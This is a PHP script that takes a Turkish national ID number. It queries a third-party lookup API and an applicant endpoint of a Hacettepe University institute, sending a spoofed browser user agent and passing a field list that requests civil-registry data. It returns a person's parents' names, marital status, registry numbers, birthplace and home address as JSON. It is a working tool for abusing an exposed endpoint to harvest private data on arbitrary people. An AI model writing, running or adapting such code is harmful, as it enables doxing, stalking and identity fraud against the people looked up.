<?php
// error_reporting(0);
header("Content-Type: application/json; utf-8;");
if(!empty($_POST['tc'])){
$tc= $_POST['tc'];
function get_birthday($tc){
$proxy = '95.170.156.220:808';
$url = "http://Fastcheck.net/apiler/api.php";
//$proxyauth = 'user:password';
$agent = 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            "tc=$tc");
// curl_setopt($ch, CURLOPT_PROXY, $proxy);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $agent);
$curl_scraped_page = curl_exec($ch);
$info = json_decode($curl_scraped_page, true);
return $info;
}
$unit_info = get_birthday($tc);
$d_tarih = $unit_info['birthdate'];
$url = "https://enstitu.hacettepe.edu.tr/aday/crud!bilgiGetir.action?yerli_kimlik_tc_kimlik_no=$tc&aday_ad=&aday_soyad=&yerli_kimlik_dogum_tarih=$d_tarih";
$proxy = '95.170.156.220:808';
//$proxyauth = 'user:password';
$agent = 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            "ayricalik=ad,soyad,baba_adi,ana_adi,mahalle,medeni_hal,cinsiyet,dogum_tarih,cilt_no,aile_sira_no,sira_no,dogum_yer,il_pk,il_ad,ilce_pk,ilce_ad");
// curl_setopt($ch, CURLOPT_PROXY, $proxy);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $agent);
$curl_scraped_page = curl_exec($ch);
$error = '{"adayList":[],"total":0,"aday_pk":1,"success":true}';
$error1 = '{"success":"hata"}';
if($curl_scraped_page === $error or $curl_scraped_page === $error1)
{
    echo (json_encode(["success" => "false", "message" => "undefined tc"]));
}
else{
function Capture($str, $starting_word, $ending_word){
    $subtring_start  = strpos($str, $starting_word);
    $subtring_start += strlen($starting_word);
    $size            = strpos($str, $ending_word, $subtring_start) - $subtring_start;
    return substr($str, $subtring_start, $size);
};
$bilgier = Capture($curl_scraped_page, '{"adayList":[','],"total":0,"aday_pk":1,"success":true}');
$bilgi = json_decode($bilgier, true);
switch($bilgi['medeni_hal'])
{
case '1':
$medeni='Bekar';
break;
case '2':
$medeni='Evli';
break;
}
switch($bilgi['cinsiyet'])
{
case '1':
$cinsiyet='Erkek';
break;
case '0':
$cinsiyet='Kız';
break;
}
$unit_tc = $tc;
$unit_name = $unit_info['name'];
$unit_surname = $unit_info['surname'];
$unit_birthdate = $unit_info["birthdate"];
$gender = $cinsiyet;
$il = $unit_info['il'];
$ilce = $unit_info['ilce'];
$mahalle = $unit_info['mahalle'];
$caddesokak =$unit_info['caddesokak'];
$bina = $unit_info['bina'];
$daire = $unit_info['daire'];
echo (json_encode([
    "success" => "true",
    "anne_adi" => $bilgi["ana_adi"],
    "baba_adi" => $bilgi["baba_adi"],
    "nufus_mahalle" => $bilgi["mahalle"],
    "medeni_hali" => $medeni,
    "cilt_no" => $bilgi["cilt_no"],
    "aile_sira_no" => $bilgi["aile_sira_no"],
    "sira_no" => $bilgi["sira_no"],
    "dogum_yeri" => $bilgi["dogum_yer"],
    "nufus_il" => $bilgi["il_ad"],
    "nufus_ilce" => $bilgi["ilce_ad"],
    "tc" => $tc,
    "name" => $unit_name,
    "surname" => $unit_surname,
    "birthdate" => $unit_birthdate,
    "gender" => $cinsiyet,
    "il" => $il,
    "ilce" => $ilce,
    "mahalle" => $mahalle,
    "caddesokak" => $caddesokak,
    "bina" => $bina,
    "daire" => $daire
  ]));
}
curl_close($ch);
}
 ?>